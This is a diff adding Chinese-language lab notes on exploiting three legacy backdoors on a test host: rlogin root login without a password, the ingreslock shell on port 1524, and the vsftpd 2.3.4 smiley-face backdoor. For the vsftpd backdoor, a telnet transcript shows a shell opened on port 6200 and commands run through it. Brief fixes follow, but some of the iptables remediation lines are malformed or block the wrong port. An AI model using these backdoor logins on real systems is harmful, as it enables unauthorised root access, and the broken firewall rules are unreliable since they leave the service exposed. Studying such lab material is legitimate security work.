@@ -1,0 +1,106 @@
+rlogin免密码登录漏洞
+
+nmap:
+513/tcp  open  login
+
+netstat:
+tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      4352/xinetd     
+tcp        0      0 10.144.53.133:513       10.144.53.132:1023      ESTABLISHED 4629/in.rlogind 
+
+
+漏洞利用,不需要密码就可以登录
+
+rlogin -l root 10.144.53.132
+
+
+漏洞修复
+
+/root/.hosts      在 + + 前面加上#
+/etc/hosts.equiv  在 + + 前面加上#
+/etc/securetty	  在 pts/0-9 和 rlogin前面加上#
+
+
+防火墙
+
+iptables -I INPUT -p tcp --dport 513 -j DROP
+
+修复完毕
+
+
+=============================================================================
+=============================================================================
+=============================================================================
+ingreslock 后门漏洞发现
+
+该端口是一个古老的令人惊讶的“ingreslock”后门，被用于入侵一个暴露的服务器
+
+nmap:
+
+1524/tcp open  ingreslock
+
+netstat -anptu
+tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      4352/xinetd 
+
+又是xinetd
+
+
+漏洞利用,不需要密码就可以登录
+
+ncat   10.144.53.133 1524   #或
+telent 10.144.53.133 1524
+
+
+防御
+iptables -I INPUT -p tcp --dport 1524 -j DROP 1524
+
+
+
+=============================================================================
+=============================================================================
+=============================================================================
+ftp 笑脸后门漏洞
+
+  扫描发现有ftp服务的,我们尝试ftp 的后门程序是否打开。
+
+  ftp有个版本包含一个后门允许一个未知的入侵者进入核心代码。这个后门很快就被确认并且移除。但是移除之前已经被少数人下载下来。如果在发送的用户名后面加上”:）“（笑脸符号），这个版本的后门会在6200端口上打开一个监听的shell。我们可以通过telnet确认。
+
+具体的漏洞发现过程如下:(用 Ctrl + ] 中断)
+[root@xclient ~]# telnet 10.144.53.133 21
+Trying 10.144.53.133...
+Connected to 10.144.53.133.
+Escape character is '^]'.
+220 (vsFTPd 2.3.4)
+user demon:)
+331 Please specify the password.
+pass invalid
+^]
+telnet> quit
+Connection closed.
+
+
+然后telnet反弹的6200的shell,每输入一个命令都需要加分号(用 Ctrl + ] 中断)
+[root@xclient ~]# telnet 10.144.53.133 6200
+Trying 10.144.53.133...
+Connected to 10.144.53.133.
+Escape character is '^]'.
+cd /root;
+: command not found
+ls;        
+vnc.log
+: command not found
+cat vnc.log;
+
+You will require a password to access your desktops.
+
+Password: Password too short
+: command not found
+
+防御
+iptables -I INPUT -p tcp --dport 1524 -j DROP 6200
+
+
+8）日志查看
+
+上述操作的日志可以分类查看, rlogin 认证成功日志
+#cat /var/log/secure
+#cat /var/log/vsftpd.log
